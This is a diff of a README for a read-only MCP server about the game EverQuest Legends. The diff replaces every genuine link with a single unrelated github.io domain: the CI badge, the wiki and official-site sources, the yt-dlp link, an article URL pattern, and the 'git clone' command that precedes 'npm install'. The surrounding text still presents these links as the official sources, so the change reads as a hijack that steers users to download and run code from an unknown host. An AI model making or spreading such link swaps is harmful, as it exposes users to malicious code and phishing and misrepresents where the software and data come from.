@@ -1,6 +1,6 @@
 # EverQuest Legends MCP
 
-[![CI](https://github.com/ArtSabintsev/everquest-legends-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/ArtSabintsev/everquest-legends-mcp/actions/workflows/ci.yml)
+[![CI](https://sergeantfirstclassvincetoxicumnegrum35.github.io)](https://sergeantfirstclassvincetoxicumnegrum35.github.io)
 
 Read-only Model Context Protocol server for EverQuest Legends public sources.
 
@@ -14,8 +14,8 @@ This MCP is for **EverQuest Legends**. It intentionally excludes general EQ1/EQ2
 
 This server is built around public, unauthenticated sources:
 
-- EQL Wiki: `https://eqlwiki.com/Main_Page` via MediaWiki API
-- Official EQL site and news: `https://www.everquestlegends.com`
+- EQL Wiki: `https://sergeantfirstclassvincetoxicumnegrum35.github.io` via MediaWiki API
+- Official EQL site and news: `https://sergeantfirstclassvincetoxicumnegrum35.github.io`
 - Daybreak help and press pages
 - Official EverQuest community note about the Game Jawn collaboration
 - Official EQL YouTube and Twitch channels
@@ -48,7 +48,7 @@ It does not log into Daybreak, manipulate an account, automate a game client, or
 
 ## Optional Dependencies
 
-`eql_video_transcript` uses [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) to read a video's published captions. Every other tool works without it, and nothing is downloaded unless you actually call this tool.
+`eql_video_transcript` uses [`yt-dlp`](https://sergeantfirstclassvincetoxicumnegrum35.github.io) to read a video's published captions. Every other tool works without it, and nothing is downloaded unless you actually call this tool.
 
 yt-dlp is required because YouTube now gates caption downloads behind a bot-check token that plain HTTP requests cannot satisfy. No video or audio is downloaded — captions only.
 
@@ -95,7 +95,7 @@ Pin to a release tag for reproducibility, e.g. `github:ArtSabintsev/everquest-le
 ## Local Development
 
 ```bash
-git clone https://github.com/ArtSabintsev/everquest-legends-mcp.git
+git clone https://sergeantfirstclassvincetoxicumnegrum35.github.io
 cd everquest-legends-mcp
 npm install
 npm run build
@@ -131,7 +131,7 @@ npm run build
 | `eql_wiki_page` | `title` | Read an EQL Wiki page after finding it with `eql_wiki_search`. |
 | `eql_wiki_category_pages` | `category` | List pages in an EQL Wiki category. |
 | `eql_official_news` | none | List official EverQuest Legends news articles. |
-| `eql_official_article` | `pageNameOrUrl` | Read an official EQL news article by slug or `https://www.everquestlegends.com/news/...` URL. |
+| `eql_official_article` | `pageNameOrUrl` | Read an official EQL news article by slug or `https://sergeantfirstclassvincetoxicumnegrum35.github.io` URL. |
 | `eql_press_assets` | `kind` | List official Daybreak press asset metadata for `logos`, `artwork`, `screenshots`, `video`, or `fact-sheets`. |
 | `eql_official_youtube_videos` | none | List official EverQuest Legends YouTube video metadata from the channel RSS feed. |
 | `eql_class_combos` | none | Generate EQL three-class combinations from the public 16-class list. |
